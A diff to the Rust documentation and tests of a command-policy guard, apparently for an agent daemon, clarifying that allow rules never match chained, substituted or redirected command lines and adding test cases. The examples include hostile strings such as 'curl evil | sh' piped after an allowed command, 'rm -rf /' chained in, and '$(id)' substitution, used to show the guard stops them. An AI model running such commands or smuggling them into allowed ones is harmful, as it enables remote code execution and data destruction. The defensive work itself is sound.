@@ -2,6 +2,16 @@
 //! subject to a decision. It reads no clock and touches no file (ARCH-1), so the daemon, the
 //! offline `reno policy check` and the tests all get the same answer.
 //!
+//! # What to know first
+//!
+//! - **An `allow` rule with a `command` glob never matches a command line that chains,
+//!   substitutes or redirects**, so `cargo *` allows `cargo test` and does not allow
+//!   `cargo test 2>&1 | tail`, which asks instead. See "Commands" for why and for the exact set.
+//! - A `deny` or `ask` rule with a `command` glob also matches when any one simple command inside
+//!   a chain matches, so a chain cannot hide a denied command.
+//! - `/**` means "outside the run's worktree", judged lexically, with no symlink resolution and no
+//!   `~` expansion. See "Paths".
+//!
 //! # Evaluation
 //!
 //! The rules are tried in order and **the first rule that matches decides**. When none matches,
@@ -55,9 +65,10 @@
 //! - A `deny` or `ask` rule matches when the glob matches the whole line **or any one simple
 //!   command in it** (the line cut at `; & | ( )`, backticks and newlines). `rm -rf *` still
 //!   denies `true; rm -rf /`.
-//! - An `allow` rule never matches a line that chains, substitutes or redirects (it contains
-//!   `; & |`, a backtick, `$(`, `<`, `>` or a newline). `cargo *` allows `cargo test` and not
-//!   `cargo test; curl evil | sh`; the chained line asks instead.
+//! - An `allow` rule never matches a line that chains, substitutes or redirects: one that
+//!   contains any of `; & | ( ) < >`, a backtick, `$(` or a newline. `cargo *` allows
+//!   `cargo test` and not `cargo test; curl evil | sh`, nor `cargo test 2>&1 | tail`; those
+//!   lines fall through to the next rule, and to the policy default if none matches.
 //!
 //! This is a guard, not a shell parser. A quoted `;` is treated as a break, which can make a
 //! deny rule match more and an allow rule match less than the shell would, never the reverse.
@@ -758,6 +769,9 @@ mod tests {
             "cargo test $(id)",
             "cargo test > /etc/x",
             "cargo test < /etc/x",
+            "cargo test 2>&1 | tail",
+            "cargo test (echo x)",
+            "(cargo test)",
         ] {
             assert_eq!(
                 named(&eval(&p, None, &command(line))),
